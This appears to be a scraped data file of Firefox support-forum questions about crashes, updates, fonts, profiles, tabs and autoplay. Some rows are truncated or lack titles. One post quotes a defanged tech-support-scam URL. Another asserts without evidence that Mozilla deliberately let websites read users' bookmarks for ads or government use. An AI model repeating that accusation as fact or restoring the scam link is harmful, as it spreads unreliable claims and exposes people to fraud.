Add-on or key for preventing/controlling cursor focus (specially in Gmail)?,"I am having trouble using Gmail. It's sluggish and its cursor focus behavior is enervating. I click a field and start typing, then Gmail, with its (or my computer's, or browser's) slowness takes a second or two to apply focus to its desired field, so it starts inputting my typing in the wrong field or worse, interpreting my inputs as actions (archiving, deleting, starring, muting conversations, opening chats, opening Google Tasks sidebar, deleting open draft, etc., really freaking messy). Example: I select a conversation, click the label button, click the label menu's text input field and start typing, then focus is removed from the field (and letters start activating those unwanted actions) and then finally Gmail apply focus to that same field, as if it' only now ready to accept input in it, even if I clicked it before.How can I prevent sites (or at least Gmail, specifically) from controlling/changing cursor focus? Is there an about:config key or an add-on for this, please?BTW, I don't mind Gmail and/or Firefox being a bit slow, I recognize I contribute to it by have a few add-ons installed and running (though not so many). What I don't want is Gmail choosing for me where my typing input is going."

How can I turn off Automatic Updates in Firefox 70?,"I am on a metered connection. Updates chew up my data, and I want to CHOOSE when to use that data for updates. There is no toggle in the configuration screen that would allow me to turn off automatic updates, and setting the preference via about:config hasn't worked. I am very irritated by this. It's my computer, it's my browser, and I don't like being forced to do what someone else has decided I should do just because they thought it would be a good idea. If I can't find a way to turn off auto updates then I'll abandon Firefox for something more user-friendly."
Why is Firefox 70.0 is ignoring my HOSTS file while other browsers work properly?,"I'm using an extensive HOSTS file to block content, etc., from websites, which is a pretty common use of HOSTS. However, Firefox 70.0 is ignoring the HOSTS file and loads sites that are explicitly named as 0.0.0.0 addresses. Other browsers, such as Chromium, work as expected and return a ""not found"" message. Is this a bug in Firefox or is there some setting, such as under about:config, that needs to be set properly? Thanks for any help/suggestions."

All websites that have video are suddenly speeding up without warning.,I was watching another episode of a Netflix show when suddenly the video was fast forwarding to 1.5 times speed and everything was fast forwarding and speaking in highpitch. I closed the website and try again only for it to keep doing it. Tried a you-tube video and it was fast forwarding as well and I check the settings speed on the video but it showed that it was normal. Tried downloading add-ons to see if it would fix it by slowing it down but instead it went either to slow or not slow enough and switching it to normal speed went back to fast forward again. I'm not sure if I accidentally smashed a couple of keys that fast forward all videos on Firefox or that my laptop has secret controls that Makes all websites' that have video player go fast forward.

"Firefox crashes on webpage opening in New Tab since 69.0.0, random occurence, does not generate crash reports.","Hello,Finally decided to make a topic about it as all of my attempts in the past few months to fix it have been in vain.Starting from Firefox 69.0 or even perhaps in 68.0, I cannot exactly remember, Firefox started to randomly crash when I opened a New Tab and tried either Googling or opening a webpage through the address bar. This crash does not create any crash reports, going to ""about:crashes"" does not reveal anything, neither are any crash reports stored locally.I have tried running Firefox in safe mode, without extensions, deleting my cache files from APPDATA/Local, deleting my profile files from APPDATA/Roaming and a lot of other stuff I honestly cannot remember anymore, but nothing has helped. I even tried downgrading to 68.0, but I received some kind of big warning message and did not want to proceed.The issue itself in essence is a full freeze, which sometimes takes a second until firefox crashes, but sometimes takes 15 seconds. During that time the only thing I can see in Task Manager is that Firefox has a ""Very High"" power usage, which is bizarre, since I am not even running it on a notebook (i7-9700K factory clock, RTX 2080S, 16GB DDR4 RAM). As said, it never produces a crash report, so I have been reluctant in reporting it in the past. And since it is random and can take many hours to occur (or can occur first thing after I turn on PC and open Firefox), it is basically impossible for me to record a video about it.(While writing this, I went to look something in a new tab, tried opening my Gmail account and the crash occurred. Added a task manager screenshot about what I meant by power usage. Fortunately it allowed me to restore the session and I did not have to re-type the entire text)From what I can gather, the issue started to happen around the time I switched over from GTX 1070 to RTX 2080 SUPER GPU. But I cannot really imagine how a GPU upgrade could influence Firefox stability. Even less so since the same Firefox issue has persevered through multiple GPU driver updates.Hope you guys have some suggestions what to try here. Perhaps some changes in about:config that could help me out here?Thanks in advance,Rasmus"

Once I did catch a box like this--maybe the computer was slowed with something else that day--which was about my giving permission to allow Amazon.com to use fingerprinting information from my browser.

"How will you stop Mozilla from destroying internet freedom? bring back anti-censorship ""dissenter"" addon","So we made the big mistake when we originally decided to ban the comment section of the internet, which gives users the ability to comment and promote free and open dialogue.

Firefox crashes after a few seconds of use,I have been having this problem for a while. I've got the latest version as of this writing 71.0 (64 bit) running on a Windows 10 Dell laptop. Firefox opens and works for a while but closes without any error dialog or message within a minute of use
Problem: opening a link from a bookmark opens in an existing tab instead of a new tab,"First, I just had a major system crash, had to re-install Linux Mint and through my own stupidity, relied on the wrong backups for my firefox configuration. So I lost my Firefox 52 install with all of my extensions (that still worked). Now, I'm running v. 57 Quantum, and a few things aren't working correctly.First, the MAJOR problem: when I open a link from a bookmark, it's clobbering an existing tab that I was using (that's why it was open, obviously). That is completely unsat and can not be allowed to continue. How do I correct this? I can't find the option under settings-->tabs to fix this problem.Second issue (major annoyance): I can no longer create a bookmark directly in a bookmark folder on the bookmark toolbar. I used to be able to open that bookmark folder, and the first option was to bookmark the currently open tab. That option has vanished, and i use that all the time. How do I restore that?Actually, one more issue: I have two tabs that are pinned and are supposed to be protected (i.e., nothing can clobber them, and I can't close them without deliberately turning the protection off (context menu right-clicking on tab). I need that back, because for some reason, firefox thinks it's ok to open a bookmark in those tabs, too, when it most definitely is NOT ok.Thanks, Jim Graham[Personal information removed by moderator.

"Preferances aren't being preserved, other weird issues...","Hello everyone!Alright, there was maybe some trouble-shooting I skipped over however this had its reasoning. However onto the problem. I'm having the oddest behaviour out of my browser. My Add-Ons don't load, except for one. ( Dashlane Add-On ). The rest; ( AdBlocker Ultimate, ftt, hide tabs, image search options, and Tiled Group Tabs ); unfortunately only partially load. In this partial state, the browser identifies them as being active, the spot on the bar normally featuring the icon for these add-ons instead starts with an empty space.I should note that at this point, direct access to the internet is completely blocked. I've tried juggling around active add-ons and it doesn't really seem to matter. So this would have been where I'd have normally clean-slated and hit the magic refresh button and uninstall and reinstall just to be safe. However I found a work around, that might provide some level of what's going on. When I open the browser, I open the add-on section and go through add-ons toggling their ability to access private tabs and then for the remaining session they all work and work entirely fine.Unfortunately, with my limited knowledge most of the debug information is above my head. I do know that I have to give permission to the add-ons again and options set within the add-ons screen are all reset to default. I would really love a solution to this, since the agony of the reset button appeals less than actually getting help to fix a problem. Perhaps helping others who may in future or now have the same problem.Anyhow... note in a bottle... cast away into the ocean of the internet.

"Configuring fonts for Unicode PUA characters, like icons or Klingon?","Hi folks. So here's the situation. I'm a developer and burgeoning font nerd, and I'm really into shell configuration for Zsh, which requires some custom fontography.These overlapping areas use various fonts that provide glyphs for characters inside the Unicode Private Use Areas. Examples are: All the things aggregated into NerdFonts - https://github.com/ryanoasis/nerd-fonts The Powerline shell-prompt symbols - https://github.com/powerline/powerline Klingon - https://www.evertype.com/standards/csur/klingon.html Anything else in the ConScript Registry - https://www.evertype.com/standards/csur/So, I'd like to set up my browser to be able to display a few, or all of these things. For example, in the discussion going on at the GitHub issue https://github.com/ryanoasis/nerd-fonts/issues/409.But I don't see any way in Firefox to set up a chain of ""fallback fonts"" or something like that. In Preferences > Language and Appearance > Fonts and Colors > Advanced, it gives me a selection for ""Fonts for:"", which allows me to assign fonts on a per-script basis. But:a) assigning a single font for ""Other Writing Systems"" (assuming that encompasses the Unicode PUA areas) is not sufficient, andb) uh-oh, maybe bug! When I select ""Other Writing Systems"" and choose a new font for it (like the Klingon font ""plqaD""), it changes the main ""Default font"" for me back in the main preferences screen! That doesn't seem right?Thing is, there are a lot of these ""long tail"" little special-purpose fonts, that it would be nice to aggregate into a single viewing context. It would be nice if Firefox supported defining an arbitrarily-long list of ""fallback"" fonts to use in the case where a web page uses a character which is not assigned a glyph in any of the normal fonts."

Library>History: 12 months (& years) folder hierarchy (navigation pane),"""firefox library history months more / 12 / twelve"" did not yield any result.I am taking advantage since a significant number of years of the HUGE history on Firefox-type (I also use Palemoon) browsers, to use these histories AS STUDY NOTEBOOKS. That is: I _always_ open a normal window, a Library>History window, and a private window (_in this order_) and browse _only_ in (the) private window(s). And move (drag & drop) studied pages carefully chosen URLs (page location tags, etc.) to the normal window (and therefore into the History), with the DATE AND TIME). (I know there is an addon for this but sometimes I know I want to save a whole sequence of page so this suits me better). This _time indexing_ and _chronological display_ of visited pages is an _invaluable_ asset in LEARNING (item linked to those visited before and after, work session span, etc.). I use the tags for notes / page extracts (the limited tag length is great because it forces to be concise).I continuously curate this history and delete LOADS of things that I decide are no longer valuable, but I still have several years worth of notes. So I search and find a page, and its date is more that 6 months in the past. Now (as explained above) I have to navigate to that time to see THE CONTEXT of THAT _learning experience_. But I have so many items in the ""Older than 6 months"" 'folder' that scrolling to the right date _is awfull_ (imprecise, skip over the right date constantly , etc._ : - ( Please tell me there is a setting to display all 12 months in the History navigation pane, or an add-on that does that or the full indexing of the History (full years and months hierarchy). If not, please someone do it ! THIS (_empowering_ people to LEARN/ STUDY) WILL change the internet / world."
Firefox won't let me use my preferred locally-installed font. Why?,"I have several fonts installed that Firefox will not let me use. They do not show up as an available choice in Options, and if a web-page specifies them they do not work (Firefox uses a backup font, instead).Chrome, Edge, and Opera all allow them.Initially I thought this might be related to https://www.mozilla.org/en-US/security/advisories/mfsa2019-21/#CVE-2019-11730 but I changed privacy.file_unique_origin to false in about:config, and restarted Firefox. That enabled one of the fonts I was trying to use, but at least two others (CASMIRA, Marlett) still won't work in Firefox.What additional validation is Firefox doing before allowing fonts to be used, that the other browsers are not performing?This should not be related to https://www.mozilla.org/en-US/security/advisories/mfsa2019-21/#CVE-2019-11730 as changing"

Phishing screen freezes Firefox,"Using Firefox, my cursor opened this link [I have removed the htt to make it dead] and my Firefox froze. It displayed an obvious phishing screen telling me to call 'Microsoft'ps://enhypostatize.xyz/en/?search=%FD6%24%FC%81%9BMC%D9%B2%01%EF%D1gN%EE%89~u%5E&list=200000#0So, I rebooted since I couldn't close FF. Opened FF again. It brought up the same link and froze again. Used Edge to google tips, opened FF in FF safe mode, and that lost the links.Reopened FF and viewed history where I found the bad link many times. Removed it from history.So my questions are these?It seems this bad link works by making a search run in a loop, effectively freezing your browser. Is that right?and...Is there a better way to solve the problem than what I did?"

libxul.so on-disk corruption observed on 2 different platforms,"I'm not sure I would have believed this if I hadn't seen it with my own eyes.Symptom: One day, out of nowhere and not pursuant to any user-initiated Firefox installation, configuration or plugin change, a deterministic set of websites begins to crash tabs immediately on page load. Reloading the same website always results in another immediate crash. If the website at a particular URL crashes a tab, it will never load or reload, because it will always crash the tab it is in. Websites not in the set of websites which crash a tab are unaffected. Restarting Firefox does not fix the problem - the same sites crash tabs after restart. Disabling ASLR does not fix the problem.I first observed this on a Mac OS X laptop (Macbook Pro 2017) running up-to-date Firefox versions at the time. This happened three times in the last six months. As I did not have time to investigate at the time, and observed that merely reinstalling Firefox from upstream archives cleared the problem, I moved on.Starting yesterday, I began to observe this on my up-to-date x86-64 Ubuntu Eoan laptop:/var/log/syslog.1:Jan 5 18:19:56 achpee kernel: [3642722.464002] Web Content[17741]: segfault at 3 ip 00007f6881995024 sp 00007ffd2548d010 error 6 in libxul.so[7f687d5ad000+4665000]/var/log/syslog.1:Jan 5 18:20:40 achpee kernel: [3642765.713880] Web Content[18209]: segfault at 3 ip 00007f2f71605024 sp 00007fff08ecc490 error 6 in libxul.so[7f2f6d21d000+4665000]/var/log/syslog.1:Jan 5 18:20:53 achpee kernel: [3642778.682450] Web Content[18253]: segfault at 3 ip 00007f46d16fd024 sp 00007ffdf062b6e0 error 6 in libxul.so[7f46cd315000+4665000]/var/log/syslog.1:Jan 5 21:18:29 achpee kernel: [3653435.096133] Web Content[27212]: segfault at 3 ip 00007f081696d024 sp 00007ffd774ee3e0 error 6 in libxul.so[7f0812585000+4665000]/var/log/syslog.1:Jan 5 21:19:52 achpee kernel: [3653518.422883] Web Content[28191]: segfault at 3 ip 00007faa3c23d024 sp 00007ffe1e89e1c0 error 6 in libxul.so[7faa37e55000+4665000]No mitigation I attempted worked until I remembered reinstallation. On a Linux box? Seriously? Follow me (in the attachment, since this forum doesn't support markdown or any sane way of formatting).By all appearances, a 64-bit word in the middle of the libxul binary was altered by some process which did not affect its mtime. Since Firefox apparently does not validate its components on startup or at any other time, this went undetected and resulted in that code crashing the process whenever it was reached.I have to say this is a bit disconcerting because I have no explanation at all for this - the package on the machine where I did the investigation was installed in a routine automatic update weeks ago and only yesterday began to exhibit the described symptoms. Perhaps it was corrupted (by CPU heat? memory? disk firmware? cosmic ray? No MCE events have been logged) when it was written out, and I happened not to visit a website which reached the corrupted code until yesterday. That seems unlikely since the crash has happened very frequently since yesterday on a variety of websites:$ sudo zgrep libxul /var/log/kern.log | wc -l32There is a prior bug report describing a similar experience here: https://trac.torproject.org/projects/tor/ticket/20100For what it's worth, a coworker on another team at my company also ran into these symptoms and mitigated it on his corporate laptop simply by reinstalling.Is there a way to mine the automated crash reporter data to see if this is an emerging trend of some kind?"

the default file manager for downloads folder and open containing folder changed,"Using Ubuntu 19.10. I recently installed the kde plasma desktop as an option so I could log off and then log in to a user I created specifically to use the KDE Plasma desktop and applications. While in Ubuntu using Gnome as the default desktop all other browsers, Chrome, Brave, Opera etc use Nautilus to open the containing folder as they should since Nautilus is the default inode/directory setting and the default file manager for Gnome. Firefox however for reasons only known to God and hopefully you guys, has chosen to use Dolphin instead of Nautilus. I always have the option of just using a different browser as my default which I may wind up doing if you can't or won't fix your issue but I am hoping it is something simple I can do on my end.

After requesting a Sync in my Android device I have them also now in there.This created back folders I had deleted as well as duplicates and overall messing with my current bookmark organization. Any clue of how I can revert back and what could have caused it?"
fix background color,"Using Options>Colors>I changed the background to ""Black"" and left the font ""White"", which was the default. I wanted ONLY the BLANK homepage black. I have a dark theme made by MaDonna. Immediately something altered, FF blinked (so to speak) and next ALL pages are a black background, including ALL webpages. Using FF instructions, I got back to a white blank homepage, but all the webpages have remained black. I've tried every combination (shown on your instruction page) to get back to a ""white"" background on the webpages. The ""Always,"" ""Never,"" only on ?? themes, clearing cache, returning to defaults, & I can still change the BLANK HOMEPAGE to either black or white, but nothing changes the webpages back to their normal views - white backgrounds. The only thing I haven't done is remove all cookies, because I truly do not want to do that."
McAfee extensions disabled,Firefox was updated to version 72 and has disabled the McAfee Secure Search and WebAdvisor extensions. It also disabled theFacebook Container extension but by reinstalling it that was fixed. I can't reinstall the McAfee externsions as they were installed as part of another package. The extensions are working in other browsers.

FF72 tabs overlay bookmark toolbar,"I have my tabs below all the toolbars. Ver 71 stuffed my Tab prefs until I figured out how to edit userChrome to move them back where I had them.

"Opening default mail client (Thunderbird) via links opens a dialoque box in IE, and results in a crash of both firefox and IE","I am using firefox as default web browser and Thunderbird as default mail client on a Windows 7 system (and have been doing so for many years). Lately, when I click on an embedded email link, such as an email address displayed on a website, rather than opening Thunderbird directly, internet explorer opens a dialogue box and asks me to confirm to open Thunderbird, which then results in a crash, as IE continues to open the dialogue box several times at once. The result is that both firefox freezes and IE crashes, and the entire operation is not successful.Please note that I did not change any settings manually, and I do not use IE for any operations."
Firefox connection to localhost domains is sporadic when there is no internet connection,"I quite often do development work on the train, and disable wifi on my laptop.

A further refresh will work, but this process always continues. Works fine in Chrome.I'd appreciate any pointers to fixing this! Thanks"
"captive portal detection fails with redirect from detectportal.firefox.com to mymodem.modem, which does not resolve","My Firefox Developer Edition just required manual help to upgrade to 73.0b2 because the auto-upgrade failed.

"Firefox Developer Edition (version 73.0b2, 64-bit) - Autoplay persists despite turning it off via options...","So I was looking at a Facebook group this morning and saw something that was posted in the group's feed that decided to autoplay on it's own despite ""Block Audio and Video"" being the default within the ""Settings - Autoplay"" screen.I don't understand why this is constantly an issue with Firefox. Every single time, every update, every install, it always and continually becomes an issue with websites that I visit with Firefox. Even a completely fresh install with that above-mentioned setting, it's still an issue--nothing to do with customization of any kind, it's just that Firefox isn't doing what it's supposed to do.What's going on here with this? Why isn't Firefox able to stop autoplay of videos within Facebook? I shouldn't have to rely on website settings to turn something like that off when it's the browser that allows the playback. I'm clearly missing something (I guess) so I'd appreciate if someone can shine some light on this because it's infuriating."
How to recover a deleted profile in Windows 7 after the Recycle Bin has been emptied?,"I used Recuva to recover the Recycle Bin files, most of which are recoverable as it was emptied recently, but I don't know which are Firefox files. I think .json are and a few others I recognize but it looks like there are thousands of files here and I don't want to recover everything as my hard drive will be filled. And how do I prevent my (small) C drive from filling up in the Users area? I have the browser installed on D drive but I can't remember if I attempted to install it as a portable installation. I think that might prevent the Users area filling up on C driver or would it fill up on a portable install? I don't even know if Mozilla offers a portable install. I just hate it when software scatters files all over the place. I want everything Firefox related in one folder. Most of the time software is like a filing system where you place your carefully organized papers into a tray and its shot out spewing the contents all over the room."

I followed the advice on this page: https://support.mozilla.org/en-US/questions/1274416?page=2 , but the format of the tabs is now a complete mess. As the image below shows, text is set awkwardly below the page icon rather than in-line, or set below view if it's over a certain length. The closs button is also set slightly above, rather than in-line with text and is missing altogether depending on the length of text. This is also the case when I remove the .CSS code to reset the tabs to above the searchbar. Any help would be much appreciated."

Web pages get stuck on 'Looking up...' and cycle through a lot of unrelated pages,"Hello,My Firefox browser (72.0, 64-bit, Win8.1) became slower at loading pages with the previous update, and I've noticed that it's caused by the same problem on each page to varying degrees. I'll click on a page to load it, then the black 'finding' dot on the tab will bobble about a bit, then it turns to the blue 'connecting' dot and keeps loading for minutes. At the bottom left the page will say 'Looking up...' and will start off with the right or at least a reasonable address, such as www.google.com etc, but then it will keep going and come up with a load of random pages that all seem connected with adverts, tracking or monitoring. For example, looking up 'www.ikea.com' took 4 minutes 23 seconds from entering it to it loading fully. In that time covered the following:Looking up www.ikea.comLooking up fonts.googleapis.comLooking up www.googletagmanager.comLooking up www.facebook.comRead s.salecycle.comLooking up www.facebook.comLooking up (numbers and letters).cloudfront.netLooking up www.google-analytics.comTLS handshake with i.salecycle.comSending i.salecycle.comLooking up www.google-analytics.comWaiting for www.google-analytics.comI don't have this problem with anything else connected to the network - I tested the WiFi connection just now on my Xbox and got 35.73, 34.31 and 35.94mb/s, but trying to load broadbandspeedchecker.co.uk on Firefox took 16m 13s just to load the page, and it's not even got near to starting the test. In that time I tried to write down all the pages it listed as looking up, waiting for, reading or TLS handshake with..., and have 44 different addresses that it was cycling through (probably more as some were very rapid) including:us.creative.comcdn.cabla.toap.lijit.comfw.adsafeprotected.comsecure.adnxs.compc.moatads.comws.sessioncam.comsync.tidaltv.comPages on my phone are loading normally within a second or two. Unfortunately I'm having to write this on my phone because Mozilla Help won't let me log in because of 'unexpected error' which I think is it timing out. I've done a full Malwarebytes scan and a full Bullguard scan with no hits, full adwcleaner with nothing, I've reset Firefox, deleted the cache and cookies and have Tracking set to Strict and still no joy. Can anyone suggest what is wrong and what I can do to fix it?"

Firefox is a corrupt organization. Here is why,"While back, firefox users got outraged due to bookmakrs comment section was removed.Users were no longer able to write comments for their bookmarks.Firefox said that websites accessing bookmarks, could also read comments which could contain personal information such as logins and passwords etc.For that reason FIrefox team decided to force users ditch comment section.The problem here is not the comments but the fact that bookmarks are accessible to other websites.Firefox is not just allowing but had implemented an API for websites to access bookmarks.This was done so that websites can crawl your bookmarks and push ads based on what they find.It may also be a government imposed function. Either one.So now that thousands of users personal information was exposed to unknown websites accessing their bookmakrs, firefox resolved this with ""taking feature away"" ? instead of ""remove bookmakrs reading by websites"" ?WTF ?I have no words to describe this moral corruption. They purposly created a function that allows websites to access your bookmarks comments. After enough information was shared they decided to pull the plug to make them selves look good as ""we care about your privacy"" ?What the hell are you talking about ?YOu care about my privacy ? STOP websites from reading my bookmarks !!!!!!!!!!!Websites should have NO access to ANYTHING. They should not know what browser i have, they should not know what bookmarks i have."

"""about:config"" setting keeps resetting after every FF update","So in FF68.0 Mozilla devs have for some reason screwed such a basic thing as drag and drop from the browser into Windows file explorer.The best fix I was able to find to restore drag and drop proper functionality is to go into ""about:config"" page, find ""browser.launcherProcess.enabled"" setting and switch it to ""false"".The problem is, the setting in question just keeps resetting to ""true"" on its own after each and every browser update, so I had to manually change it back to ""false"" after FF69 update, FF70 update, FF71 update and FF72 update, basically 4 additional times already if not even more (I don't quite remember about XX.0.1 types of updates).It's frankly getting ridiculous and extremely annoying by that point.

Weird Things Happening Firefox for Developers (blocklist.xml ?),"Hey all, Going to keep this short - but, pretty sure devices have been compromised. Firefox has been acting strange lately.

I can't install any add-ons from the store,"Hi, everybody. I have a problem that I can't solve on my own. In the FAQ or search, I did not find a mention (I could search poorly)I will try to summarize the essence: immediately after installing Firefox (from www.mozilla.org) on ​​my PC, I tried to enable the synchronization in order to (including) download my extensions that I used previously on other devices. After that, I found that none of them could be installed (they did not even appear in the Add-ons Manager list). In addition, I noticed that the list of recommended add-ons from the Manager's is displayed incorrectly (there are no preview images). When I tried to download a add-on manually from the list by clicking the ""+ Add to Firefox"" button, I received a pop-up message that ""The add-on could not be downloaded of a connection failure"" (I use a wired connection (Ethernet) to my PC, without any restrictions. At this point, I was using Chrome in parallel without any problems). I tried to go to (addons.mozilla.org) and found the same behavior. Images were not displayed and extensions were not downloaded (Download failed. Please check your connection.).What I tried to do to solve the problem: reset the default settings; disable syncing; run in Safe Mode; delete Firefox entirely, and install it again. But all these actions did not solve my problem.I will be grateful to anyone who can answer me. I'm counting on you."

Too many login suggestions for website,"Since a recent update, I now see WAY too many login suggestions for a website's username field. The issue is that the site has the same subdomain as other sites that I use on my company's network.For example, if the following sites exist:aaaa.lan.domain.combbbb.lan.domain.comcccc.lan.domain.comddd.lan.domain.cometc., then when I browse to the login page for aaaa.lan.domain.com, the login suggestion popup will have ALL of the various logins for ALL of the various subdomains. There will be a huge popup with numerous logins that aren't even usable for the site I'm on. Firefox didn't do this until just recently (like a week ago or so), and before, it would only suggest the logins for the exact site you were on.Is there a way to force the old behavior?"

How do I get firefox to log into websites automatically?,"I have various login usernames and passwords for various websites.

"Unexpected behavior with ""jump to end of word"" keyboard shortcut on macOS","I often use the ""Option+Left/Right Arrow"" keyboard shortcut to navigate through text.In Chrome and other programs, this works how I would expect it: using this site, the first press of the right arrow will move the cursors after ""https"" and before the "":"" character. A second will move it to the end of ""support"" before the ""."" character.However, Firefox will jump to between the ""//"" characters"" and ""support"" on the first press, and will jump over the period after ""support,"" before the word ""mozilla.""This applies to the address bar, but also anywhere text is present, such as a form text area.Strangely, moving the other direction does not skip past punctuation.The behavior exhibited does not match that of the native operating system (moving to the end of a word, excluding punctuation) so I find it somewhat jarring. Is this something that could potentially be changed by a config and/or fixed at the application level?Thanks."
I seem to have 2 versions of Firefox but I don't know where the 2nd one is.,"I installed a portable version and its working great. But when I click a link in an email another version is launched. I can tell because the number of extensions that are present are different in each. I've looked for it in the usual location in C:\Program Files but its not there. It doesn't seem to be anywhere on C, I searched with Ultrasearch. And the portable version is in just 1 location on D. Where else could it be? I did notice that there seems to be 2 versions of Firefox within the portable version but could they both be used? I went into Control Panel, Default Programs and noticed there is both Firefox and Mozilla Firefox Portable Edition to choose from. Huh??? The non-portable edition seems to be hiding somewhere but I have no idea where it could be."

Firefox not functioning beyond the opening screen in Windows 10 - January 2020,"A week ago, when starting Firefox, the message 'updating Firefox . . . ' appeared before the progrom loaded. I've seen this before and it has always continued to load Firefox.This time, after some hard-drive activity, the program did not load.I started looking for support and chose to uninstal v72 - shut down my laptop and restarted it.I downloaded the latest version and at the end of install - where 'run firefox' is expected - nothing happened.I have since uninstalled and downloaded the latest beta version (73) - and now, when I ask to run the program, it opens a window but all the tabs are 'dead' and no matter what I type, the program does not connect to the internet (i.e. Google search or direct to a known web address).If I select settings, I can see the drop-down list - but if I select 'Add-ons' (for example) - nothing happens.I attempted to run my laptop in safe mode, but I have no recall of the password needed to get past the login screen.Is there anything simple I can do to bring my Firefox back to life?"

permanently block updates,"I've been using Firefox since Netscape ended and i always enjoyed it. Unfortunately the Firefox 72 is utterly hideous. It is the worst and most unstable browser i ever tested -- it's extremely slow, it doesn't even work with hardware acceleration, it's not compatible with most sites i access and it crashes a lot. Anyway I already reinstalled the version 71, which continues to work flawless and I don't plan to ever use auto updates again. The problem is that every single day Firefox tries to update to the horrible 72 version, and every day I have reject it manually.I'm looking for a way to permanently block future Firefox updates, without asking me for it again. Any ideas?"

Youtube with Vega 8 (AMD iGPU) 1080p problems,"The gpu usage (more specifically the encoding) has crazy spikes which causes frames to drop (a lot of them).I'm almost sure this only happens with vp9 and so far I've only seen it happen in 1080p and over (1080p60 etc).The gpu should be more than able to play these. And in the moments it isn't spiking it's only using like 30 to 40% so it is more than able.Edit 1: It's really strange because I just watched 4k60 videos and 1080p60 videos in both VP9 and AV and they worked just perfect and then I went to a 1080p24 in VP9 and it skips like hell. And then I went back to the previous video and it gets almost 100% skipped frames at 4k60 when just 5 minutes ago it was playing it fine.So basically I can't successfully reproduce the problem the same way all the time. Maybe you guys have some tools I can use to do more in-depth testing.Edit 2: I am now convinced that the problem lies with the iGPU not having enough memory because one common thing that I noticed every time there's skipping is that the vram is pretty much full.At the same time that's strange because the system should then use the system memory as shared memory, right?I checked my BIOS to see if I could increase the iGPU memory but it literally only gives me a single option, which isn't even the correct one since it shows 128MB and I have 256MB, or at least the specs of the laptop, Firefox (about:support) and Windows says so.I know there's other laptops with this iGPU that can change that so if anyone has one that can test that we would know."

On December I copied a profile as it was written in your guides: (https://support.mozilla.org/en-US/kb/back-and-restore-information-firefox-profiles) I copied everything from:%APPDATA%\Mozilla\Firefox\Profiles\I hadn't investigate what is inside.

I couldn't login to Sync, due i hadn't remembered my password - ok its my fault, but when i wanted to reset i would lose all my data?! Why is that? I can understand due to its encrypted but... Luckly after some combination i recovered my password. 2. So i copied my profile as it was written in your guide, and i hadn't investigate what is inside. Now when i tried to copy my whole profile its not working, why? Well, i checked and there were no file: places.sqlite . I have no clue why, so my backup from December is lost. 3.

You claim that we will have bookmarks, saved passwords, cache and history yes thats true, but history for only 8 weeks..... I understand that it has many bytes to store, but it should be somewhere information about it!If i would knew that i would be more prepared for lost, and did more often proper backup by MozBackup.

How to get tabs from a previous session back when FF starts?,"Hello everyone. I am an old FF Windows user, but faced something new since moved to FF on Mac. It does keep previous session when I try to troubleshoot - so I mean starting it, opening couple of tabs and trying to restart - but unfortunately it does not if FF kept opened for days or weeks. That's a pain, as lot of pinned tabs collected to the moment and I simply do not remember what was that weeks ago and it's not so easy to search throughout the history. Of course, Startup set to Restore previous session and History set to Remember. I am aware there might be sessionstore.js or something like this, but might be there is some additional magic option to be set to avoid the issue? I am aware of that ""last window to close - the only to remember"" problem. This is not the case. Just one window. Only pinned tabs. Clean window on start. No option to restore previous session (it's empty).Appreciate any idea. Thanks. P.S. I have found this thread, unfortunately it was left unanswered and archived: https://support.mozilla.org/ru/questions/1174479"

"I have a problem with the option ""browser.tabs.closeTabByDblclick""","I have a problem with the option ""browser.tabs.closeTabByDblclick"". This function does not work as it should.Firstly, if I want to close the neighboring tab, I just need to click on the tab first, and only then double-click to close. I don't know who came up with this, but in normal terms it should close tab without first choosing.Secondly, the function does not work with a quick double click, you need to press slowly. This is very annoying, you click on the tab and it does not close because you click ""too fast"".I could not find a solution and apologize for the translation errors."

How to control url suggestions?,"Is there any way to control specific url selections?90% of the time i am using a browser, i am using one site (drive.google.com). But when i type in ""d"" the suggested url is ALWAYS 'docs.google.com' (see screenshots). It seems to be getting this from the url of individual documents in the history, as i NEVER use or want to go to 'docs.google.com', as it is just a less featured and organized version of 'drive.google.com'. But i can't seem to delete it! I would like to be able to have url suggestions from history, but not this specific one!I am trying to migrate over to firefox from chrome, and as silly as it sounds i can't do that if typing in ""d"" doesn't get to my most-accessed site. It's really annoying to keep accidentally going to 'docs.google.com'."

Can someone help me with the PR_END_OF_FILE_ERROR,"I am facing this PR_END_OF_FILE_ERROR problem from last 15 days, I tried EVERY possible solutions posted in different community supports (Microsoft, and firefox) and also checked every possible article on this problem but none of those helped me. I see firefox tries to do some ""TLS handshake with the server"" everytime before this problem apperars. Then I tried a solution provided by a user in microsoft community, the suggested me to switch the proxy setting to ""Auto detect proxy for this site"" and ""Enable DNS over https"", and it was working for me. But from last 2 days I started facing the same issue again. The webpages only works when I start Firefox in Safe Mode. It's so frustrating and makes it impossible to use Firefox. And leaves me with no other option but to use Microsoft Edge. I really like Firefox so wanted to know if anyone could help me fix this issue with something New and Effective."
